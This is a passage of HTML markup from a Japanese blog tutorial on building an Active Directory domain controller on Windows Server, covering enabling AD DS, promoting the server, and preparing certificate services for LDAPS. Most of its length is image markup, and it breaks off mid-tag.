&lt;li&gt;&lt;a href=&quot;#%E5%84%AA%E5%85%88dns%E3%82%B5%E3%83%BC%E3%83%90%E3%81%AE%E5%AE%9B%E5%85%88%E3%82%92%E3%83%89%E3%83%A1%E3%82%A4%E3%83%B3%E3%82%B3%E3%83%B3%E3%83%88%E3%83%AD%E3%83%BC%E3%83%A9%E3%81%AEip%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E3%81%AB%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B&quot;&gt;優先DNSサーバの宛先をドメインコントローラのIPアドレスに設定する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%AF%E3%83%A9%E3%82%A4%E3%82%A2%E3%83%B3%E3%83%88%E3%82%92%E3%83%89%E3%83%A1%E3%82%A4%E3%83%B3%E3%81%AB%E5%8F%82%E5%8A%A0%E3%81%95%E3%81%9B%E3%82%8B&quot;&gt;クライアントをドメインに参加させる&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#ad%E3%81%B8%E3%81%AE%E5%8F%82%E5%8A%A0%E3%81%AB%E5%A4%B1%E6%95%97%E3%81%97%E3%81%9F%E5%A0%B4%E5%90%88%E3%81%AE%E3%83%88%E3%83%A9%E3%83%96%E3%83%AB%E3%82%B7%E3%83%A5%E3%83%BC%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0&quot;&gt;ADへの参加に失敗した場合のトラブルシューティング&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%8C%87%E5%AE%9A%E3%81%95%E3%82%8C%E3%81%9F%E3%83%89%E3%83%A1%E3%82%A4%E3%83%B3%E3%81%8C%E3%81%AA%E3%81%84%E3%81%8B%E3%81%BE%E3%81%9F%E3%81%AF%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B9%E3%81%A7%E3%81%8D%E3%81%BE%E3%81%9B%E3%82%93%E3%81%AE%E3%82%A8%E3%83%A9%E3%83%BC%E3%81%8C%E5%87%BA%E3%82%8B%E5%A0%B4%E5%90%88&quot;&gt;「指定されたドメインがないか、またはアクセスできません」のエラーが出る場合&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#dns%E3%81%AE%E3%82%A4%E3%83%99%E3%83%B3%E3%83%88%E3%82%92%E7%A2%BA%E8%AA%8D%E3%81%99%E3%82%8B&quot;&gt;DNSのイベントを確認する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#ad%E3%83%89%E3%83%A1%E3%82%A4%E3%83%B3%E5%90%8D%E3%81%ABlocal%E3%82%92%E4%BD%BF%E3%81%A3%E3%81%A6%E3%81%84%E3%82%8B&quot;&gt;ADドメイン名に.localを使っている&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#ipv6%E3%82%92%E7%84%A1%E5%8A%B9%E5%8C%96%E3%81%99%E3%82%8B&quot;&gt;IPv6を無効化する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#dns%E3%81%AB%E3%82%88%E3%82%8A%E3%83%89%E3%83%A1%E3%82%A4%E3%83%B3%E3%82%B3%E3%83%B3%E3%83%88%E3%83%AD%E3%83%BC%E3%83%A9%E3%81%AE%E5%8F%82%E7%85%A7%E3%81%8C%E3%81%A7%E3%81%8D%E3%81%A6%E3%81%84%E3%82%8B%E3%81%AE%E3%81%ABad%E3%81%AB%E5%8F%82%E5%8A%A0%E3%81%A7%E3%81%8D%E3%81%AA%E3%81%84&quot;&gt;DNSによりドメインコントローラの参照ができているのにADに参加できない&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E9%80%A3%E6%90%BA%E3%81%8C%E3%81%86%E3%81%BE%E3%81%8F%E3%81%84%E3%81%8B%E3%81%AA%E3%81%84%E3%81%A8%E3%81%8D%E3%81%AF&quot;&gt;連携がうまくいかないときは&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#ldaps%E3%82%92%E6%9C%89%E5%8A%B9%E3%81%AB%E3%81%97%E3%81%A6%E3%82%A2%E3%83%97%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%A8ad%E9%80%A3%E6%90%BA%E3%81%99%E3%82%8B&quot;&gt;LDAPSを有効にしてアプリケーションとAD連携する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;adサーバの構築&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ad%E3%82%B5%E3%83%BC%E3%83%90%E3%81%AE%E6%A7%8B%E7%AF%89&quot; aria-label=&quot;adサーバの構築 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ADサーバの構築&lt;/h2&gt;
&lt;h3 id=&quot;adの基本&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ad%E3%81%AE%E5%9F%BA%E6%9C%AC&quot; aria-label=&quot;adの基本 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ADの基本&lt;/h3&gt;
&lt;p&gt;AD環境において、リソースはドメインコントローラ（DC）によって管理されます。&lt;/p&gt;
&lt;p&gt;このドメインコントローラの機能を提供しているのは、AD DSです。&lt;/p&gt;
&lt;p&gt;今回構築するAD DSでは、組織単位のリソースグループ（OU）を作成して、ユーザやサーバなどのオブジェクトを管理します。&lt;/p&gt;
&lt;p&gt;また、権限や設定は、グループポリシーによって定義することができます。&lt;/p&gt;
&lt;p&gt;AD環境において、ドメインの集まりはフォレストと呼ばれます。ADを作成するときは、必ず一つのフォレストと一つのドメインが必要となります。&lt;/p&gt;
&lt;h3 id=&quot;環境情報&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E7%92%B0%E5%A2%83%E6%83%85%E5%A0%B1&quot; aria-label=&quot;環境情報 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;環境情報&lt;/h3&gt;
&lt;p&gt;ADサーバ用のWindowsServerの構成情報です。&lt;/p&gt;
&lt;p&gt;※コンピュータ名を15バイト以上にしてしまっていると、NetBIOS名に変換する際に短縮されます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 532px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/bc726a41d571759699cef3768eae7d64/89a37/image-28.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 72.91666666666666%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB6UlEQVQ4y5VT25aiMBD0/z/Pl52XXUXukACCkCBIbVcrDs7MzpxtT0gg6UpVV7tblgVdf8XgJxkzisqhbj1M45DbHqZ26N0Ehhz9MXbzPCMrW0mU5KrD77BGYQckZY8gaRHlHaqzIxxutxtI4Luxm6YryiJHwZHnqGsD7wfcZmG1zC+3M4Gg340dD14uFxz+HBDFMeI4QRSFCI4BEln3lx7DMKCX4cfxZ8l8UHZVWWFX43w+o2ka1NV9zdkaC2srtG37T6lPQNIkAGfGOv9vrOVQhgTMsgzOuycoD1y6DsYYHVleoKkrJEmKsiy13qw7c/MsxXidtA0UkFLe3n4hlQ0CT9PdDCOJQRCg73u5zGMcvawHmUcxzmltp2nS9apMAQdJCIIj9vu9GrMGmYRhKHMhNa6kjlbYCruigJV37p9OJzV1la2AbB3KIv1tdCI5F2lGgYyaZq1BIRfwPU4TBKdALx0fHbAjZd58d7fWdZKmyoRApSSG0kZfNvVDJtfslE0fkkmmAG3b6SYP3Wt4xOFw0L3l0WJfgb9Ids4JqwS5uJYKu2G4u12Lq3EcqVFkXRZG3d3W7FMf8kEXoyhSyUdh1D0SWI7Rj1qf20ae/jasXv7L/EjbWfCPQVPoJA3wzj8BsLw388f4CxXZi9/5rj6cAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/bc726a41d571759699cef3768eae7d64/8ac56/image-28.webp 240w,
/static/bc726a41d571759699cef3768eae7d64/d3be9/image-28.webp 480w,
/static/bc726a41d571759699cef3768eae7d64/b5f85/image-28.webp 532w&quot;
              sizes=&quot;(max-width: 532px) 100vw, 532px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/bc726a41d571759699cef3768eae7d64/8ff5a/image-28.png 240w,
/static/bc726a41d571759699cef3768eae7d64/e85cb/image-28.png 480w,
/static/bc726a41d571759699cef3768eae7d64/89a37/image-28.png 532w&quot;
            sizes=&quot;(max-width: 532px) 100vw, 532px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/bc726a41d571759699cef3768eae7d64/89a37/image-28.png&quot;
            alt=&quot;image-28.png&quot;
            title=&quot;image-28.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;adを有効化する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ad%E3%82%92%E6%9C%89%E5%8A%B9%E5%8C%96%E3%81%99%E3%82%8B&quot; aria-label=&quot;adを有効化する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ADを有効化する&lt;/h3&gt;
&lt;p&gt;まずはサーバの役割の追加から、Active Directory ドメインサービスを有効化します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/d5547c4a678269c9d70b872c0c6e1bfc/0b533/image-13.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 62.916666666666664%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAARlAAAEZQAGA43XUAAACNklEQVQ4y3VTy5LTMBD0x3PhzkfshTtUURwo4MJpDyke2U3ixE4kW5b8kmXJj2ZG2V2WLVDV1IylcaunZ5RYo9B/e4dw+xGYPOZlwTzP/7VlYVui8TfWFY9rpTjphhHKzRA2QHfDPwAeLpimGHsf0LQtlKowDA4LgSzLGj2vxA0WumkgTA1BSVWl6YcOWhtUZFpr1MagsQ5SGZwvArKs0DQdvPMEhGhhXuDCjETWFtJ0MMTQNC36tgFmjzXQ7X6AtRajc7AjV2BREVBL4H6aYf21Kt0PGCgew4Lk9Yd7vPmU4tX7HfZlj+1J4ObLL9x8/o63X39AEeNxdCjJF7pGRZVwyVyBpliRl1QZ7/mJNOTkq15T1CnNL7jdpvh5lNhmBYH5CChLRbop5HmG8zlHmqaRfQiBdPXkPbGckEwEwmDs+bCQAqoQWKfw1L2FLhSFghtHnE4n7HY7tMQodpnPqVnc7Z40TXiTwa6AE4QQJPyFfuho79ppPrvIMnYzEJvsxCzPkEJCPOVOsC68BAyQUuL+7g77/YE6zqMxRClEcQXkxSU6Ghk+Y6YjMeecvxiy50QGTA8HbDYbiouok6Mu67qJc8cx5zFILPXZsi8BOSnPc2RZRgz3OB6PUYK6NugJjME7YhSt62gWm6gn/3Mm43FKmPJz46S6rqNnK8sSZVHEYe7pVbG1NHc8Psy6rEyMK9P8Aez7Pt7OxrrwNzN4jI15eDF0Qdf10fhFadofSIKRJWBdqcLfDN7lCNqUKGgAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/d5547c4a678269c9d70b872c0c6e1bfc/8ac56/image-13.webp 240w,
/static/d5547c4a678269c9d70b872c0c6e1bfc/d3be9/image-13.webp 480w,
/static/d5547c4a678269c9d70b872c0c6e1bfc/b0a15/image-13.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/d5547c4a678269c9d70b872c0c6e1bfc/8ff5a/image-13.png 240w,
/static/d5547c4a678269c9d70b872c0c6e1bfc/e85cb/image-13.png 480w,
/static/d5547c4a678269c9d70b872c0c6e1bfc/0b533/image-13.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/d5547c4a678269c9d70b872c0c6e1bfc/0b533/image-13.png&quot;
            alt=&quot;image-13.png&quot;
            title=&quot;image-13.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;このまま次に進んでいき、[必要に応じて対象サーバーを自動的に再起動する]の設定を有効化した状態でインストールを開始し、しばらく待ちます。&lt;/p&gt;
&lt;p&gt;より詳しい手順は以下のサイトなどが参考になると思います。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://ittrip.xyz/soft/windows/ad-setup-ad-easy&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Active Directory サーバー（ADサーバー）の構築手順を初心者にも分かり易く徹底解説 | IT trip&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;また、ドメインコントローラはデフォルトではLDAPSが利用できません。&lt;/p&gt;
&lt;p&gt;Active DirectoryとLDAPSで連携する他のアプリケーションを利用したい場合は、LDAPSを利用するための証明書が必要となります。&lt;/p&gt;
&lt;p&gt;ドメインコントローラに認証サーバを導入して自己証明書でLDAPSを利用できるようにするためには、ここでAcrtive Directory 証明書サービスも一緒に追加しておきましょう。&lt;/p&gt;
&lt;h3 id=&quot;ドメインコントローラに昇格する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%89%E3%83%A1%E3%82%A4%E3%83%B3%E3%82%B3%E3%83%B3%E3%83%88%E3%83%AD%E3%83%BC%E3%83%A9%E3%81%AB%E6%98%87%E6%A0%BC%E3%81%99%E3%82%8B&quot; aria-label=&quot;ドメインコントローラに昇格する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ドメインコントローラに昇格する&lt;/h3&gt;
&lt;p&gt;有効化が完了すると、以下の画像のような表示になります。&lt;/p&gt;
&lt;p&gt;続いて、[このサーバーをドメインコントローラーに昇格する]をクリックしてドメインコントローラを作成していきます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 625px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/11ca18025b88eb65cab87bde36999afd/80d71/image-15.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 67.91666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAACPElEQVQ4y51T22oTURSdj0qEYB/qQ3wS+xeNBaU/4CVINFTQPvvmj/gkiPhSCcZqTJu0ucxk7pOZc+aWmeXeJxeSUkHcsNjnklln77VXtFqthttQrd5BpVKlXKVc2QGf1et17O/fw8MHddyvUz44wN7eXWiNRgM3cXjYwIvnT/H6VQvNZhOtVgvtdnsHp6fvcPLmLT68b+Hls2M8fnKMo6NH0CIhEEURQUAIBq1FgiwcQAZXGE8MSClxM/LFAmVZIk5y6PoMYThXHFqWpVjkGfIsQ5qmCkkcYz6fw3FsTMdjTAiWacKxbZU914FLcFxX7Q1DR0bfJ0kCbS5TGK6AGyYoikK9yq9nsYBJBJ3eBc4vh7g2TIxMBxPLRm9swHQ8SOrIJVKTSDn4ey3NCwQiRRTnRAYFjr7uo3MxhUmv20Qc+L6SJgxDzIjM8wNEtHYcR91zcDEayi1h6KBUjCWmfowvv0b4+K2LTz/6+NwbEIY4G4xUZUzOmrM0XOWGkCsriiVRuSpP7UlX0zLxtfMdZ91zdPuX6PzsYThZVmxZFjzP22BDOHEEuO31wRpcheUF1LqF31MS3naRSIGYJr50g1DT90kKbntDGIgMRVnuWIIveGJ+EGB4dQ1jNiN7JIhp+lLGKjP4N+FKxy3CFIK8FMYZpq6Ew9Omi4DIeHq6rmNGhNzmbeA7rnJDmC/IJqRZkhVq0jJdrKZdYLEyL9uB13/DdihjL0Hm3jI47/8V6z8EQ1vrIVf6bGv0P/gDsPfvf4wE8WEAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/11ca18025b88eb65cab87bde36999afd/8ac56/image-15.webp 240w,
/static/11ca18025b88eb65cab87bde36999afd/d3be9/image-15.webp 480w,
/static/11ca18025b88eb65cab87bde36999afd/487e2/image-15.webp 625w&quot;
              sizes=&quot;(max-width: 625px) 100vw, 625px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/11ca18025b88eb65cab87bde36999afd/8ff5a/image-15.png 240w,
/static/11ca18025b88eb65cab87bde36999afd/e85cb/image-15.png 480w,
/static/11ca18025b88eb65cab87bde36999afd/80d71/image-15.png 625w&quot;
            sizes=&quot;(max-width: 625px) 100vw, 625px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/11ca18025b88eb65cab87bde36999afd/80d71/image-15.png&quot;
            alt=&quot;image-15.png&quot;
            title=&quot;image-15.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;構成ウィザードが開いたら、[新しいフォレストを追加する]から任意のドメイン名を設定します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/749bc15be35b1458ec6de23edb25c317/0b533/image-26.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 73.75%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAARlAAAEZQAGA43XUAAACUElEQVQ4y41UXW/TMBTNL+aN38A7vwAJiSceeEQboA4QGwPG2OjWscLSNmVJm2RO4thxbOdw7a5dmDaEpaPr+OP4nuPrBKPxBMOznxj+uMDJ+QQHxyOcnoeYXqaYxekqXt7ETZ/moiQnZAjnCx93D0cItG7Baw6gw03rerivdVCNRFUWSJIYSgo8efoMwcE0x8dfS+yHOT5PGC6ZoLUdjLUwxkDrFVzfoW01fWsopZClGZbLJRaLBcqyxPbgPYLHOxM82hrj4YtTPHg+xOAsQRr/xmQ69Ys5535zXdcQQlwfon3sum6jxyVRK4PAKlpYFYBtaVDDkgWz2QxTIgwvQkRRhDiOEYYhGGMbwtswRiPnDQLVNCgo3aKsoI312SySBFmWYz6fIyIURUlSW5+L9VboHlYHWIoZVwgEXYiT5k5fe5PnOVLyx5FWVUVyOWpJ4wVHwSUESVujvZbvyL1kc02yPsll4r5FLXzf+dRRVo1qSQUHF5JIjIfSpifZgNWUoTOz74UjcZN2c8s3GxzxvySnJXnofFlvWBP+bba54yJMD3pDeMX/k7BPfBfW85VsV4TtLcnojMdd5XEfnHxWU4bOdEUk7gW4UxTFtJRImKQy6mViV7Cd85cOc/75MfK1s3QVFsUqQ9esrzHdKv8aXHmkrIKUEg3BxVYoKNGiLNz7bWAaqg7RQFI1cMYhK4El/TSC1+/2sbWzh5eDPYzDCDkrkV0x5IRlzpASYqrJr7Nj7E+PsP19F29Gn/AtPsEwOsN4PsGrowHenn7Al9kh/gAEHoFhtySIewAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/749bc15be35b1458ec6de23edb25c317/8ac56/image-26.webp 240w,
/static/749bc15be35b1458ec6de23edb25c317/d3be9/image-26.webp 480w,
/static/749bc15be35b1458ec6de23edb25c317/b0a15/image-26.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/749bc15be35b1458ec6de23edb25c317/8ff5a/image-26.png 240w,
/static/749bc15be35b1458ec6de23edb25c317/e85cb/image-26.png 480w,
/static/749bc15be35b1458ec6de23edb25c317/0b533/image-26.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/749bc15be35b1458ec6de23edb25c317/0b533/image-26.png&quot;
            alt=&quot;image-26.png&quot;
            title=&quot;image-26.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;設定はデフォルトで問題ないので、ドメインコントローラオプションからパスワードを設定します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/3ff8d86206a1469719ab33792915db67/0b533/image-17.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 73.75%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAARlAAAEZQAGA43XUAAACe0lEQVQ4y2VU227UMBDNp8MTb/wH4gVRipBKq74hEKAWdVG6hVV3u5vLxrk6Tpw4zmHG2fRGpCN7bc+ZmTMz6yUiQxQL7GkVaY7NNkBCa6M7Qg9FqNvuPyhC0xl3X9YN+mHEx8/n8GSr6YIOmxaFat2+oj2j63tYO8AOz0BnA62NUqjKAmEQQIiEbDp4Y6dgCYAlDBitQUukujcwZjJ0sBZ2HInMOhhjkGWUlRBICKlIUSoifHl0hRdHC7w+X+PVyQpfVwKqKpAkiXssK0l7kmSfYLfbuXNFkfUUPTsaycn0jai1gXfqxzi+2OBkEeJsKbBOJIosxWZzh6IoXTRsVJYlFlcL+L6P5XKJIAwRErTWLlqGZEKYFjDaeXB+ht4Zp2lK+pSopERd1w5ZliPPCUXhomQw0STLgbAgoyiOsae0zGDRNA122y2iKMJ6vcbN8oZED50T55CiHR9pyWQzqSNU5LmqKrRt6y66rrsn45RYeElRZmnmnM0E93hOOIs7e2NCjoZJCkqtJB0zSp+J+TdLwekzCdtOxFMnuKI89sh7FpkryVEyaUctxF9MVT46/oR37z/gy7cf1FYDNXfvenVurVLpB8J55QecPsvAkXAU3MyKGn0bRLjbhYiT1BEy+kdFqXrLhOapJoYiGi2r79ZpKiajh298akNDMNBbsVrDm7UbDiOlKcVcajev8gCemofKznrb+0rbg7PbN2/had26FPUBXMlSKtSqoR5UkDVB1iio/7jF8rJ2aOkdzzJ3CZ9LshVRAk9kNGYz6F9G5AX1ZOp0yrjCRYVoL3D128f131t8/+Xj0l8hFjmCaI+A735e4PL0DH92Mf4BVDN+QZmP+qcAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
